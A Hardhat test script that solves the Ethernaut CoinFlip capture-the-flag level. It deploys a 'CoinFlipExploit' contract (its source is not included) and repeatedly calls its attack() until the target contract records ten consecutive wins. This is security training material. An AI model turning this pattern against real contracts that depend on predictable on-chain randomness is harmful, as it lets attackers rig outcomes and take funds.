import { ethers } from "hardhat";
import { utils } from "ethers";
import { expect } from "chai";

describe("CoinFlip", function(){
	it("Aims to Solve the CoinFlip Question of the Ethernaut CTF", async function(){
		this.timeout(0);

		// Initial Setup (Wallet etc..) 
        const accounts = await ethers.getSigners();
        const eoa = accounts[0];
        let balance = await eoa.getBalance();

        console.log(ethers.utils.formatEther(balance));
        expect(balance).to.gt(0); // Check if the wallet amount is greater than 0 (If you have any money)

        // Define Target ABI
        const targetABI = [
            "function flip(bool _guess) public returns(bool) ",
            "function consecutiveWins() public view returns (uint256)",
        ]
        const targetAddr = "0x11Cf37149433C534Ac4615063F6152e5Ff4D0648"; // Target Contract Address Here

        // Connect to the Target Contract
        let contract = new ethers.Contract(targetAddr, targetABI, ethers.getDefaultProvider());
        let targetCont = contract.connect(eoa);

        // Define and Connect to the Malicious Contract
        const maliciousFactory = await ethers.getContractFactory("CoinFlipExploit");
        const maliciousContract = await maliciousFactory.deploy(targetAddr);

        // Wait for Malicious Contract to be Deployed
        await eoa.provider!.waitForTransaction(maliciousContract.deployTransaction.hash);

        // Exploit Target Contract via Malicious Contract
        let consecutiveWins = await targetCont.consecutiveWins();
        console.log(`Current Win Count: ${consecutiveWins}`);

        while(consecutiveWins < 10){
        	let transaction = await maliciousContract.attack();
        	await transaction.wait();
        	consecutiveWins = await targetCont.consecutiveWins();
        	console.log(`Current Win Count: ${consecutiveWins}`);
        }

        //Final Check
        expect(consecutiveWins).gte(10);
	});
});